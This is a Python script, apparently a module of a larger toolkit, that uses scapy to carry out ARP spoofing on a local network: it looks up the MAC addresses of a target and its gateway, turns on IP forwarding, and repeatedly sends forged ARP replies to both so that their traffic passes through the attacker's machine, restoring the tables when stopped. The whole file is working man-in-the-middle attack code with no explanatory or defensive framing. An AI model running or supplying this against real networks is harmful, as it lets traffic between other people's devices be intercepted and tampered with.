#!/usr/bin/env python3
"""
arp_spoof.py - ARP spoofing (local network only)
"""

from scapy.all import ARP, Ether, srp, send
import time
from .utils import setup_logging, enable_ip_forwarding

logger = setup_logging("arp_spoof")

def get_mac(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp_request
        result = srp(packet, timeout=2, verbose=False)[0]
        if result:
            return result[0][1].hwsrc
    except Exception as e:
        logger.error(f"Error getting MAC: {e}")
    return None

def arp_spoof(target_ip, gateway_ip, interface=None):
    if not interface:
        interface = "eth0"
    logger.info(f"Target: {target_ip}, Gateway: {gateway_ip}")
    enable_ip_forwarding()
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        logger.error("Could not get MAC addresses")
        return
    logger.info(f"Target MAC: {target_mac}")
    logger.info(f"Gateway MAC: {gateway_mac}")
    try:
        logger.info("ARP spoofing running... Press Ctrl+C to stop")
        while True:
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        logger.info("Restoring ARP tables...")
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), verbose=False)
        logger.info("ARP tables restored")